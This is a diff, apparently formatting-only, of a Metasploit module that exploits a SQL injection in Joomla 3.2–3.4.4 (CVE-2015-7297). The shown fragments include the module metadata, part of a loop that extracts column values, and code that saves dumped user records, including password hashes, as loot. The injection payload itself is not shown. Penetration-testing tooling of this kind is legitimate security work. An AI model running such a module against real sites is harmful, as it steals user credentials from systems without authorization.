@@ -8,31 +8,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Joomla com_contenthistory Error-Based SQL Injection',
-      'Description'    => %q{
-        This module exploits a SQL injection vulnerability in Joomla versions 3.2
-        through 3.4.4 in order to either enumerate usernames and password hashes.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Joomla com_contenthistory Error-Based SQL Injection',
+        'Description' => %q{
+          This module exploits a SQL injection vulnerability in Joomla versions 3.2
+          through 3.4.4 in order to either enumerate usernames and password hashes.
+        },
+        'References' => [
           ['CVE', '2015-7297'],
           ['URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Asaf Orpani', # discovery
           'bperry',      # metasploit module
           'Nixawk'       # module review
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2015-10-22'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2015-10-22'
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/'])
-      ])
+      ]
+    )
   end
 
   def check
@@ -151,6 +153,7 @@ class MetasploitModule < Msf::Auxiliary
         loop do
           value = request(query_fmt % [col, l, i], payload, lmark, rmark)
           break if value.blank?
+
           record[col] << value
           l += 54
         end
@@ -179,12 +182,14 @@ class MetasploitModule < Msf::Auxiliary
       tables.each do |table|
         cols = query_columns(db, table, payload, lmark, rmark)
         next if cols.blank?
+
         path = store_loot(
           'joomla.users',
           'text/plain',
           datastore['RHOST'],
           cols.to_json,
-          'joomla.users')
+          'joomla.users'
+        )
         print_good('Saved file to: ' + path)
       end
     end
